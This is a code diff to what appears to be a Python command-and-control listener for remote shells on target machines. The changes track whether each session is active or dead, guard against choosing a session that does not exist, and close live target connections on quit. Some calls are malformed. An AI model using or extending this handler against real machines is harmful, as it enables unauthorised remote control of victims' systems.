@@ -98,7 +98,7 @@ def conn_handler():
                 plat_val = 2
             else:
                 plat_val = 0
-            a.append([conn,addr[0]],username,admin_val,plat_val)
+            a.append([conn,addr[0]],username,admin_val,plat_val,'Active')
         except:
             pass
 
@@ -110,6 +110,7 @@ def target_conn(target_id, a, num):
             if msg == "exit":
                 print("closing the connection")
                 target_id.close()
+                a[num][5]="Dead"
                 break
             elif msg == 'background':
                 break
@@ -159,6 +160,7 @@ def target_conn(target_id, a, num):
             if res == 'exit':
                 print('client closed connection')
                 target_id.close()
+                a[num][5]= "Dead"
                 break
             print('response from client : ', res)
         except KeyboardInterrupt:
@@ -216,21 +218,37 @@ if __name__=='__main__':
                 session_counter=0
                 if command.split(" ")[1] == "-l":
                     table=PrettyTable()
-                    table.field_names = ['Session_id', 'Target_ip','Username','Admin','OS']
+                    table.field_names = ['Session_id', 'Target_ip','Username','Admin','OS', 'Status']
                     table.padding_width = 3
                     for target in a:
-                            table.add_row([str(session_counter),target[1]],target[2],target[3],target[4])
+                            table.add_row([str(session_counter),target[1]],target[2],target[3],target[4],target[5])
                             session_counter += 1
                     print(table)
                 if command.split(" ")[1] == "-i":
-                    num = int(command.split(" ")[2])
-                    target_id = a[num][0]
-                    target_conn(target_id,a,num)
+                    try:
+                        num = int(command.split(" ")[2])
+                        target_id = a[num][0]
+                        if a[num][5] == "Active":
+                            target_conn(target_id,a,num)
+                        else:
+                            print("Session is already Dead")
+                    except IndexError:
+                        print(f'session {num} does not exist')
         except KeyboardInterrupt:
             print("\n Keyboard interrupt issued")
-            kill_flag=1
-            break
-    sock.close()
+            quit_msg=input("Do you want to quit?\n Press Y if Yes and N if No")
+            if quit_msg.lower()=='y':
+                for target in a:
+                    if target[5] == "Dead":
+                        pass
+                    else:
+                        conn_out(target[0], "exit")
+                kill_flag=1
+                if listener_count > 0:
+                    sock.close()
+                break
+            else : 
+                continue
 
                    
 
